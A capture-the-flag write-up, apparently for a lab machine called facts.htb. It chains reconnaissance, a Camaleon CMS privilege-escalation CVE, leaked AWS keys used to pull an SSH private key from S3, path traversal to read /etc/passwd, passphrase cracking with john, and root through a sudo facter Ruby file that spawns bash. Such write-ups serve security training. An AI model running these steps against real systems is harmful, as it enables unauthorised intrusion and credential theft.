### Initial Scan
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-10 21:33 +0200
Nmap scan report for 10.129.56.184
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.28 seconds
```

### Recon
Looking for VHosts, I could not find any:
```
ffuf -u "http://facts.htb" -H "Host: FUZZ.facts.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.facts.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 1117 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

Directory Fuzzing produced a lot of false positives, however there are certain redirects, which might be interesting: 

```
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2130ms]
admin.cgi               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2129ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2131ms]
admin.pl                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2068ms]
```

Visiting `admin` lets us see a login page:

![[login.png]]

Looking into the source code of the page, I see that this seems to be a known CMS system called Cameleon:
```html
<script src="[/assets/camaleon_cms/admin/admin-basic-manifest-3896669961ec58669ff8c38eff8ddbde23935fca25fed539252f7705c2b073d1.js](http://facts.htb/assets/camaleon_cms/admin/admin-basic-manifest-3896669961ec58669ff8c38eff8ddbde23935fca25fed539252f7705c2b073d1.js)"></script>
```
I created an account, and the version says 2.9.0, so i check for CVEs, that might belong to this version.

Then, i found following CVE, which affects version prior to 2.9.1: 
```
CVE-2025-2304
```

The CVE describes an Privilege Escalation attack vector, where a lower-level authorized user can gain Administrator rights by exploiting a flaw in the password change mechanism.
I used following script, which already automated this:
```
https://github.com/Alien0ne/CVE-2025-2304/blob/main/exploit.py
```

Under Filesystem settings in `http://facts.htb/admin/settings/site`, I found some AWS credentials.

```
aws configure --profile ctf


Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: AKIAB4A4D1AE9AB10B09
AWS Secret Access Key [None]: DLp6ER9zk1qzwnUz2qVsBoHP2zSuCrI1pRjt2g3/
Default region name [None]: us-east-1
Default output format [None]: json
```

```
aws s3 ls \                                                
  --endpoint-url http://facts.htb:54321 \  
  --profile ctf \
  --region us-east-1

2025-09-11 14:06:52 internal
2025-09-11 14:06:52 randomfacts
```

```
aws s3 ls s3://internal \
  --recursive \
  --endpoint-url http://facts.htb:54321 \
  --profile ctf \
  --region us-east-1
  
  ...
  2026-09-10 21:32:52        464 .ssh/id_ed25519
```

Get the ssh key:
```
aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 \
  --endpoint-url http://facts.htb:54321 \
  --profile ctf \
  --region us-east-1

download: s3://internal/.ssh/id_ed25519 to ./id_ed25519   
```

However, i do not know a user, which I need to connect to. So, I stepped back into recon, and found another critical vulnerability for version 2.9.0: A Path Traversal attack, which helps us find the users on the target machine.
```
https://www.exploit-db.com/exploits/52531
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

So we have the users, william and trivia. 

Using the passkey, we are prompted with a passphrase:
```
ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519': 
```

It took some time, but cracking revealed the following passphrase:
```
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed22519)     
1g 0:00:03:19 DONE (2026-09-10 22:31) 0.005005g/s 16.01p/s 16.01c/s 16.01C/s sharks..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```


### Priv Esc
```
sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

I checked the GTFObins entry for this and took the following steps to achieve root on the system:
1. I placed a `root.rb` with the content `exec("/bin/bash")` into the home directory
2. This command then ran opened a shell with sudo rights: `sudo /usr/binfacter --custom-dir=/home/trivia x`

![[success.png]]
